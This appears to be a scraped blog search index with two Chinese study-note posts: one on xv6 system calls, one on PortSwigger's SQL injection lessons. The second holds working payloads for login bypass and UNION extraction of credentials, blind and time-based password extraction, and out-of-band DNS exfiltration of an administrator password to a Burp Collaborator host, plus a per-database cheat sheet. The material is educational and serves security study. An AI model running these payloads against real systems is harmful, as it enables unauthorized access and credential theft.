parent, not the child. buf[strlen(buf)-1] = 0; // chop \\n if(chdir(buf+3) \u003c 0) fprintf(2, \"cannot cd %s\\n\", buf+3); continue; } if(fork1() == 0) runcmd(parsecmd(buf)); wait(0); } runcmd 是对 exec 的封装 为什么不把 fork 和 exec 两个系统调用结合一起成为一个新的系统调用 之后介绍的shell的I/O重定向就利用到了分成两个的妙处。内核通过使用虚拟内存技术（比如写时复制）优化了 fork 的实现 Xv6 隐式地为分配大多数用户空间内存。对于在运行时需要更多的内存的进程（malloc）可以调用 sbrk(n) 去将内存增长 n 个字节，sbrk 返回新内存的位置。 ","date":"2023-03-04","objectID":"/posts/xv6_book_chapter_1/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system interfaces","uri":"/posts/xv6_book_chapter_1/"},{"categories":["刷课笔记"],"content":"I/O和文件描述符 文件描述符是一个整数，表示进程可以从中读取的内核管理对象。进程可以通过打开文件、设备或通过创建一个管道，或者通过复制现有文件描述符去获得一个文件描述符。 xv6 使用文件描述符作为每个进程的索引，每个进程都有一个从 0 开始的文件描述符私有空间。按照规定，进程从文件描述符0（标准输入）读取，向文件描述符1（标准输出）写入，将错误信息写到文件描述符2（标准错误）。shell 确保它总是打开3个文件描述符： // Ensure that three file descriptors are open. while((fd = open(\"console\", O_RDWR)) \u003e= 0){ if(fd \u003e= 3){ close(fd); break; } } read 和 write 系统调用从文件描述符命名的文件读写字节。 read(fd, buf, n) 从文件描述符 fd 读 n 个字节复制到 buf 中，并返回读取的字节数。引用文件的文件描述符都有一个与之关联的偏移量。read 从当前的文件偏移量中读数据，然后按照所读取的字节数再进行偏移，后续读取将返回第一次读取返回的字节之后的字节。当没有字节可读的时候，read 返回 0 以示到达文件结尾。 write(fd, buf, n) 将 n 个字节从 buf 写入文件描述符 fd，并返回写入的字节数。和 read 一样，write 在当前文件偏移量处写数据，然后按照写入的字节数增加这个偏移量，每次写入都从前一次写入停止的地方开始。 下面的程序片段（构成 cat 程序的本质）将数据从标准输入复制到标准输出，如果发生错误，它将向标准错误写入一条消息： char buf[512]; int n; for(;;){ n = read(0, buf, sizeof buf); if(n == 0) break; if(n \u003c 0){ fprintf(2, \"read error\\n\"); exit(1); } if(write(1, buf, n) != n){ fprintf(2, \"write error\\n\"); exit(1); } } close 系统调用释放一个文件描述符，从而自由地调用 open、pipe 或 dup 系统调用。 文件描述符和 fork 交互使得 I/O 重定向易于实现。新分配的文件描述符是当前进程编号最低的未使用的文件描述符。 fork 将父进程的文件描述符和其内存一起复制。exec 替换进程的内存，但保留其文件表。这种行为允许 shell 通过 fork 实现 I/O 重定向。下面就是对 cat \u003c input.txt 命令的翻译 char *argv[2]; argv[0] = \"cat\"; argv[1] = 0; if(fork() == 0) { close(0); open(\"input.txt\", O_RDONLY); exec(\"cat\", argv); } 子进程关闭文件描述符 0 后，open 将对新打开的使用该文件描述符。cat 使用引用了 input.txt 的标准输入文件描述符执行。 Xv6 的 shell 中的 I/O 重定向代码是这样工作的： case REDIR: rcmd = (struct redircmd*)cmd; close(rcmd-\u003efd); if(open(rcmd-\u003efile, rcmd-\u003emode) \u003c 0){ fprintf(2, \"open %s failed\\n\", rcmd-\u003efile); exit(1); } runcmd(rcmd-\u003ecmd); break; open 的第二个参数由一组 flag 组成，这用来控制 open 的操作。值定义在 kernel/fcntl.h 中 #define O_RDONLY 0x000 #define O_WRONLY 0x001 #define O_RDWR 0x002 #define O_CREATE 0x200 #define O_TRUNC 0x400 只读、只写、可读可写、不存在文件就创建、将文件截断为 0 长度。 虽然 fork 复制了文件描述符的表，但是每个文件描述所对应的文件的偏移量是共享的。 dup 系统调用复制一个现有的文件描述符，返回一个引用相同 I/O 对象的新文件描述符。两个文件描述符共享一个偏移量。如下就是一个写 hello word 的代码： fd = dup(1); write(1, \"hello \", 6); write(fd, \"world\\n\", 6); 除了上述情况之外，文件描述符不共享变量，即使它们是由同一个文件产生的。dup 允许 shell 实现下列命令： ls existing-file non-existing-file \u003e tmp1 2\u003e\u00261 其中 2\u003e\u00261 告诉 shell 一个文件描述符 2，existing-file 的名称和 non-existing-file 的错误信息将会显示在文件 tmp1 中。不过 xv6 的 shell 不支持这个写法。 ","date":"2023-03-04","objectID":"/posts/xv6_book_chapter_1/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system interfaces","uri":"/posts/xv6_book_chapter_1/"},{"categories":["刷课笔记"],"content":"管道 管道 (pipe)是一个小的内核缓冲区，作为一对文件描述符公开给进程。这一对文件描述符一个用于读取，一个用于写入。数据写入管道的一端可以让其在另一端被读取。这为进程提供了一种通信方式。 下面的示例代码使用管道将标准输入和 wc 程序连在一起 int p[2]; char *argv[2]; argv[0] = \"wc\"; argv[1] = 0; pipe(p); if(fork() == 0) { close(0); dup(p[0]); close(p[0]); close(p[1]); exec(\"/bin/wc\", argv); } else { close(p[0]); write(p[1], \"hello world\\n\", 12); close(p[1]); } 程序调用 pipe 创建管道，并在数组 p 中记下读写文件描述符。fork 之后，父子进程都有引用管道的文件描述符。子进程调用 close 和 dup 使文件描述符 0 引用管道的读取端的文件描述符，关闭 p 记录的文件描述符，调用 exec 运行 wc。父进程关闭管道的读取端，往写入端写数据，然后关闭它。 如果没有数据可用，管道的 read 将会等待写入数据或者关闭所有引用写入端的文件描述符，后者 read 将返回 0。read 在不会有新数据到来之前会一会等待是上面在执行 wc 之前关闭管道的写入端的一个重要原因，如果 wc 的文件描述符之一指向管道的写入端，wc 将永远不会结束。 Xv6 的 shell 以下面的代码实现了诸如 greo fork sh.c | wc -l 之类的管道。 case PIPE: pcmd = (struct pipecmd*)cmd; if(pipe(p) \u003c 0) panic(\"pipe\"); if(fork1() == 0){ close(1); dup(p[1]); close(p[0]); close(p[1]); runcmd(pcmd-\u003eleft); } if(fork1() == 0){ close(0); dup(p[0]); close(p[0]); close(p[1]); runcmd(pcmd-\u003eright); } close(p[0]); close(p[1]); wait(0); wait(0); break; ","date":"2023-03-04","objectID":"/posts/xv6_book_chapter_1/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system interfaces","uri":"/posts/xv6_book_chapter_1/"},{"categories":["刷课笔记"],"content":"文件系统 Xv6 系统提供了数据文件和目录。这些目录形成一个树。使用 chdir 系统调用可以更改进程的当前目录。下面两个代码用于打开同一个文件。 //No.1 : chdir(\"/a\"); chdir(\"b\"); open(\"c\", O_RDONLY); //No.2 : open(\"/a/b/c\", O_RDONLY); 系统调用 mkdir 可以创建新目录，open 使用 O_CREATE 可以创建新的文件，mknod 可以创建新的设备文件 mkdir(\"/dir\"); fd = open(\"/dir/file\", O_CREATE|O_WRONLY); close(fd); mknod(\"/console\", 1, 1); mknod 创建一个引用设备的特殊文件。与设备文件关联的是主设备号和次设备号（mknod的两个参数），它们唯一地标识一个内核设备。当一个进程要打开一个设备文件时，内核转移 read 和 write 系统调用给内核设备的实现，而不是传递给文件系统。 文件名称不同于文件本身，同一个底层文件（叫做 inode）可以由多个名称（叫做 link）。每个 link 由目录的一个条目组成，该条目包含文件名和对 inode 的引用。Inode 保存有关文件的 metadata，包括其类型（文件、目录还是设备）、长度、文件内容在磁盘中的位置以及指向那个文件的 link 的数量。 fstat 系统调用从文件描述符引用的 inode 中检索信息。 #define T_DIR 1 // Directory #define T_FILE 2 // File #define T_DEVICE 3 // Device struct stat { int dev; // File system's disk device uint ino; // Inode number short type; // Type of file short nlink; // Number of links to file uint64 size; // Size of file in bytes }; link 系统调用创建对相同inode引用的另一个名称称作为一个已有文件。下面的代码创建一个由 a 和 b 两个名字的新文件： open(\"a\", O_CREATE|O_WRONLY); link(\"a\", \"b\"); 对 a 的 I/O 操作也会作用到b上面。每个 inode 由一个唯一的 inode 编号标识。执行完上面的两行代码后，可以通过检查 fstst 的结果来确定 a 和 b 引用相同的内容：二者返回相同的 inode号 (ino)，并且 nlink 计数为 2。 unlink 系统调用从文件系统中删除一个名称。只有当文件的 link 数量为 0 并且没有文件描述符引用它时，文件的 inode 和占用磁盘空间才会被释放。 fd = open(\"/tmp/xyz\", O_CREATE|O_RDWR); unlink(\"/tmp/xyz\"); 上面的代码时创建临时 inode 的惯用方法，当进程关闭 fd 或退出时就会被清掉。 Unix 提供了可以在 shell 作为用户级程序调用的一些对文件操作的程序，例如 mkdir、ln和rm。这种设计允许通过添加新的用户级程序去扩展命令行，但是 Unix 时代其他系统经常在 shell 中实现这些命令，并在内核中实现 shell。 cd 是一个例外，它内置在 shell中。因为它会更改 shell 本身的当前工作目录。如果 cd 作为一个常规命令运行，shell 去 fork 一个子进程去运行 cd，这无法影响到父进程。 if(buf[0] == 'c' \u0026\u0026 buf[1] == 'd' \u0026\u0026 buf[2] == ' '){ // Chdir must be called by the parent, not the child. buf[strlen(buf)-1] = 0; // chop \\n if(chdir(buf+3) \u003c 0) fprintf(2, \"cannot cd %s\\n\", buf+3); continue; } ","date":"2023-03-04","objectID":"/posts/xv6_book_chapter_1/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system interfaces","uri":"/posts/xv6_book_chapter_1/"},{"categories":["刷课笔记"],"content":"现实状况 Unix 结合了“标准”文件描述符、管道和便于操作的 shell 语法，这是编写程序的一个重大进步。这个想法引发了一种 software tools 的文化，这种文化很大程度上让 Unix 变得强大和流行。 Unix 系统调用接口已经通过 POSIX (Portable Operating System Interface)标准进行了标准化。Xv6 并不和 POSIX 兼容，前者少了很多系统调用，并且许多系统调用的实现也不一样。 和 Xv6 相比，现代操作系统内核提供了更多的系统调用和更多种类的内核服务。现代内核持续迅速地发展，提供了许多超越 POSIX 的特性。 Xv6 没有用户的概念，所有进程都以 root 权限运行。 ","date":"2023-03-04","objectID":"/posts/xv6_book_chapter_1/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system interfaces","uri":"/posts/xv6_book_chapter_1/"},{"categories":null,"content":"PortSwigger Web Academy 中关于 SQL 注入的部分","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分 SQL Injection ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:0:0","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"漏洞概述 SQL注入是一个Web漏洞。该漏洞能够让攻击者影响Web应用对其数据库的查询，通常允许攻击者查看无法查看到的数据，其中可能包括其他用户的数据。很多时候攻击者可以通过该漏洞修改甚至删除这些数据。 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:1:0","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"成功的SQL注入的影响如何 成功的SQL注入可能导致未授权访问敏感数据。近年来很多数据泄露事件都是SQL注入导致。有时攻击者可以依此在系统中获取一个持久的后门。 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:1:1","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"漏洞利用方向 一个常见的SQL注入的利用方向包括： 返回隐藏数据，修改SQL查询以返回其他结果 更改Web应用逻辑，更改查询以干扰Web应用的逻辑 联合查询，从不同的数据库检索数据 查询数据库本身的信息 盲注，查询的结果不会返回 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:2:0","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"漏洞利用 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:0","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"返回隐藏数据 假设一个显示不同类别的购物网站，用户单击礼物的时候，请求的URL是这样： https://insecure-website.com/products?category=Gifts 这将导致Web应用执行SQL查询，从数据库中查找相关产品的信息 SELECT * FROM products WHERE category = 'Gifts' AND released = 1 该SQL查询要求数据库返回： 所有 (*) 来自product表 其中的category得是Gifts 并且released等于1 其中released = 1用于隐藏没有发布的产品。如果该网站没有防御SQL注入的话，攻击者修改URL成这样： https://insecure-website.com/products?category=Gifts'-- 这样SQL语句就得是： SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 这里的关键就是--，这是SQL中的注释符号。这样就有效地屏蔽了AND released = 1的作用。 攻击者还可以更进一步，查看任何类别的所有产品： https://insecure-website.com/products?category=Gifts'+OR+1=1-- SQL语句就会是： SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 这样就会返回category是Gifts或者1=1的产品，因为1肯定是等于1的，所以会返回所有。 --是SQL中的注释符号。在MYSQL中，--后面需要跟一个空格，或者使用#来表示注释符。 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:1","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"更改Web应用逻辑 假设一个允许用户通过用户名和密码的方式登录的网站。用户提交用户名为username，密码为passwd，Web应用确认是否这正确的SQL语句这样写： SELECT * FROM users WHERE username = 'username' AND password = 'passwd' 这里攻击者可以作为任意用户登录，只需SQL中的注释符号--，屏蔽掉密码检查那一部分。例如提交用户名administrator'--和一个空密码就会让SQL语句变成这样： SELECT * FROM users WHERE username = 'administrator'--' AND password = '' ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:2","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"联合查询 攻击者可以从数据库的其他表中检查数据，这是利用UNION关键字完成，它允许再加一个或多个SELECT查询并把结果追加到原本的查询结果上。 SELECT a, b FROM table1 UNION SELECT c, d FROM table2 这个SQL查询将返回一个包含两个列的结果，包含table1的a、b的值和table2的c、d的值。 联合查询的要求： 每个查询返回的列的数量是相同的 每个列的数据类型必须和各个查询兼容 为了满足这两个要求，通常要弄清楚： 原本的查询返回多少列 原本的查询返回的那些列有合适的数据类型用来保存查询的结果 确定列的数量 ORDER BY 注入一系列ORDER BY语句并递增指定的column index直到报错。假设注入点和上述都差不多，就应该是： ' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- etc. 上述这些payload修改了原本的查询，让结果中的所有列按照其中某一列的顺序进行排序，具体哪一列由ORDER BY指定，因此无需知晓列的名称。当指定的column index超过了实际的列的数量时，数据库就会报错，比如： The ORDER BY position number 3 is out of range of the number of items in the select list. 网站可能会在HTTP响应中体现出这个错误，也可能是在返回结果中，或者就不返回。检测响应中的差异来判断到底由多少列。 UNION SELECT 提交一系列UNION SELECT的payload，指定不同数量的空值： ' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- etc. 如果空值的数量和列的数目不一样，数据库就会报错，如： All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists. 和第一个方法一样，网站对返回报错的态度是不一样的。当空值的数量和列的数量匹配时，数据库会多返回一行，其中每列都是空值。对HTTP响应的影响取决去网站代码。幸运的话，攻击者可以在响应中看到额外的内容，比如HTML表中的另一行。否则空值会触发不同的错误，如NullPointerException。最难的是，该响应可能因为不正确的空值数量引起的响应无法区分，导致这个方法失效。 使用NULL的原因是因为每个列的数据类型有个兼容问题，NULL可以转换成任何常用的数据类型，可以最大限度地提高payload得以成功的机会。 在Orcale数据库中，每一个SELECT查询都需要一个FROM关键字并指定一个有效的表。Orcale有一个double内置表。因此，payload在Orcale数据库中可以是这样： ' UNION SELECT NULL FROM DUAL-- 查找有用的列 通常查找的数据将采用字符串的格式，因此攻击者需要再原本查询结果中找到一个或多个数据类型为字符串或者和它兼容的列。 确定了列的数量后，可以提交一系列的UNION SELECT的paylaod来测试每个列，以测试是否可以保存字符串数据，例如： ' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'-- 如果列的数据类型和字符串数据不兼容就会报错，如： Conversion failed when converting the varchar value 'a' to data type int. 如果没有报错。并且网站的响应包含一些附加内容（注入的字符串值），就可以用这个列来查询字符串数据。 查询数据 当确定了列的个数和有用的列的位置，就可以开始查询数据了。 假设： 原本的查询返回两列，两列都可以保存字符串数据 注入点和上述一样是WHERE中带单引号的字符串 数据库中有一个名为users的表，其中由username和password两列 这样的话，相关payload应当是这样： ' UNION SELECT username, password FROM users-- 使用这样的payload的关键也在于攻击者知道表名和列名。现在数据库都提供了一些方法去确定它有那些表和列。 在一个列中查询多个值 还是上述的例子，如果只有一个合适的列的话，可以把这些值连接到一起并在中间加上用于区分的分隔符。例如，在Orcale中，payload可以是这样： ' UNION SELECT username || '~' || password FROM users-- ||在Orcale中用于字符串连接。该payload把用户名和密码连接起来，并且用~分隔 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:3","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"查询数据库本身的信息 SQL注入中，通常需要收集与数据库本身相关的信息，比如数据库的类型和版本，以及包含的表名和列名。 数据库的类型和版本 不同的数据库的查询语句也不同。通常需要多次查询来找到一个有效的查询，从而确定数据库的类型和版本 数据库类型 查询语句 Microsoft, MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() 例如你输入如下paylaod ' UNION SELECT @@version-- 如果返回类似下面的输出，那就确认数据库是Microsoft SQL Server并且也能得到它的版本 Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 \u003cX64\u003e (Build 14393: ) (Hypervisor) 列出数据库的内容 大多数数据库（除了Orcale）都有一个information schema用于提供有关数据库的信息 攻击者可以查询information_schema.tables以列出数据库中的表 SELECT * FROM information_schema.tables 输出可能是这样： TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE 这个输出表明由三个表，分别是Products、Users和Feedback。 攻击者可以通过查询information_schema.columns来列出指定表的列 SELECT * FROM information_schema.columns WHERE table_name = 'Users' Orcale中的information schema 在Orcale中需要用别的方法来达到上述的效果 SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = 'USERS' ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:4","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"盲注 当存在SQL注入但是不存在回显的时候就需要用到盲注。 布尔盲注-有回显 假设一个网站使用tracking cookies来收集关于使用情况的分析，cookie可能是这样： Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4 当处理包含TrackingId的cookie的请求时，服务器使用如下的SQL语句确定该用户的身份 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' 这样的查询就存在SQL注入，但是查询的结果不会返回。但是对于不同的数据，网站的行为可能有所不同，假设提交的ID被是被成功，网页会显示一条欢迎回来之类的信息，这样的行为足矣。 假设注入下述语句： …xyz' AND '1'='1 …xyz' AND '1'='2 第一个值将返回结果，因为注入的'1'='1是正确的，因此会显示欢迎回来，所以第二行不会显示欢迎回来。这就允许攻击者确定任何表达是否正确。 假设有一个名为Users的表，列是username和password，并且诶存在一个名为Administrator的用户。攻击者可以通过一系列的paylaod确定此用户的密码。 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) \u003e 'm SUBSTRING函数在一些数据库中叫做SUBSTR。 如果这样的输入会显示欢迎回来，说明密码的第一个字符是大于m。 如果不显示欢迎回来这样的信息的话，返回数据库报错信息也是可以的。 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 这俩payload使用CASE关键字来测试条件，根据表达式是否成立从而返回不同的表达式。第一个payload，CASE表达式应当返回'a'，这没有错。第二个payload中，将会计算1/0，这就会导致一个错误。如果是否出错会让有些地方产生差异，攻击者可以根据差异来判断。 使用CASE关键字，上面那个SUBSTRING的payload还可以这样写 xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) \u003e 'm') THEN 1/0 ELSE 'a' END FROM Users)='a 时间盲注 在不回显的时候，通常会使用时间盲注。通过条件是否成立来影响HTTP请求的响应时间。 这个方法因使用的数据库类型的不同而不同。在Microsoft SQL Server中，下面的payload可以用来实现时间盲注 '; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'-- 第一个payload不会触发延迟，第二个则会触发延迟。 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) \u003e 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 带外 (OAST) 加入网站执行SQL查询是异步执行的。网站在原本的线程处理用户的请求，另一个线程使用tracking cookie来执行SQL查询。因为网站的响应不会回显，也不会因查询而花费时间，所以上述方法都失效。 此时通常利用盲注去使服务器与out-of-band (OAST)网络进行交互。 可以使用多种网络协议实现这一点，通常最有效的是DNS服务，很多网站允许DNS的自由进出，它对它们的正常运行至关重要。 触发DNS查询的方法因数据库类型的不同而不同。在Microsoft SQL Server上，下面的payload用于在指定域名进行DNS查询 '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- 确定来触发带外交互的方法后，可以开始拿数据了 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree \"//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a\"')-- 因为带外成功的可能性很大并且能直接拿数据，所以其在盲注中是一个非常强大的方法。即使其他盲注也可是可行的，带外也可以是一个优先考虑的选项。 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:5","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"除了SELECT的SQL注入 大多数SQL注入漏洞出现在SELECT查询的WHERE子句中。理论上，SQL注入漏洞不仅出现在SELECT语句中。出现SQL注入漏洞的常见的其他位置分别是 UPDATE，在更新的值或者WHERE子句中 INSERT，在插入的值中 SELECT，在表或列的名称中 SELECT，在ORDER BY子句中 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:6","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"不同上下文的SQL注入 攻击者可以使用任何会被网站带入SQL语句处理的可控输入来进行SQL注入攻击。例如一些网站会接收JSON或XML格式的输入并使用它来查带入SQL语句。 不同的格式甚至可以提供混淆payload的方法来绕过网站的防御机制。 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:7","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"二次注入 二次注入，这通常通过将输入放入数据库中完成。存储到数据库的时候不会出现问题，在网站处理请求检查存储的数据，将其以不安全的方式合并到SQL语句中就出了问题。 二次注入通常因为网站开发者会信任放入数据库的数据而导致的。 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:3:8","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"漏洞检测 添加'之类的字符查找错误或其他异常 添加一些特定的用来计算潜在注入点原本的值和另一个值的SQL语句 添加一些布尔表达式，寻找响应之间的差异 添加时间盲注的payload 添加带外的payload ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:4:0","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"数据库间语句的差异 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:0","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"连接字符串 数据库类型 语句 Oracle ‘foo’||‘bar’ Microsoft ‘foo’+‘bar’ PostgreSQL ‘foo’||‘bar’ MySQL ‘foo’ ‘bar’ CONCAT(‘foo’,‘bar’) MYSQL有两种方式，注意第一种方式中两个字符串之间的空格 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:1","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"截取字符串 偏移量索引从1开始。 数据库类型 语句 Oracle SUBSTR(‘foobar’, 4, 2) Microsoft SUBSTRING(‘foobar’, 4, 2) PostgreSQL SUBSTRING(‘foobar’, 4, 2) MySQL SUBSTRING(‘foobar’, 4, 2) ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:2","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"注释符 数据库类型 语句 Oracle –comment Microsoft –comment /*comment*/ PostgreSQL –comment /*comment*/ MySQL #comment – comment /*comment*/ 注意MYSQL的第二种方式--后面有一个空格，URL使用这种注释符的话要对其进行URL编码，用+来表示 。 ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:3","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"查询数据库版本 数据库类型 语句 Oracle SELECT banner FROM v$version SELECT version FROM v$instance Microsoft SELECT @@version PostgreSQL SELECT version() MySQL SELECT @@version ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:4","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"查询数据库的表和列 数据库类型 语句 Oracle SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = ‘TABLE-NAME-HERE’ Microsoft SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’ PostgreSQL SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’ MySQL SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’ ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:5","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"判断条件的报错 （标题原本是Conditional errors，直译的话是个什么东西啊，所以瞎起来一个名字） 数据库类型 语句 Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual Microsoft SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END PostgreSQL 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END) MySQL SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),‘a’) ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:6","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"堆叠注入 可以将多个语句连接起来。后面的语句不会有回显，所以多用于盲注。 数据库类型 语句 Oracle Does not support batched queries. Microsoft QUERY-1-HERE; QUERY-2-HERE PostgreSQL QUERY-1-HERE; QUERY-2-HERE MySQL QUERY-1-HERE; QUERY-2-HERE ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:7","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"时间延迟 数据库类型 语句 Oracle dbms_pipe.receive_message((‘a’),10) Microsoft WAITFOR DELAY ‘0:0:10’ PostgreSQL SELECT pg_sleep(10) MySQL SELECT SLEEP(10) ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:8","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"DNS查询 数据库类型 语句 Oracle 该例子利用XXE触发，漏洞已被修复，但有的网站用的Orcale没修复： SELECT EXTRACTVALUE(xmltype(’\u003c?xml version=“1.0” encoding=“UTF-8”?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM “http://BURP-COLLABORATOR-SUBDOMAIN/\"\u003e %remote;]\u003e’),’/l’) FROM dual 以下用于打了补丁后的，但需要高权限: SELECT UTL_INADDR.get_host_address(‘BURP-COLLABORATOR-SUBDOMAIN’) Microsoft exec master..xp_dirtree ‘//BURP-COLLABORATOR-SUBDOMAIN/a’ PostgreSQL copy (SELECT ‘’) to program ’nslookup BURP-COLLABORATOR-SUBDOMAIN’ MySQL 下面例子只适用于Windows: LOAD_FILE(’\\\\BURP-COLLABORATOR-SUBDOMAIN\\a’) SELECT … INTO OUTFILE ‘\\\\BURP-COLLABORATOR-SUBDOMAIN\\a’ ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:9","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL 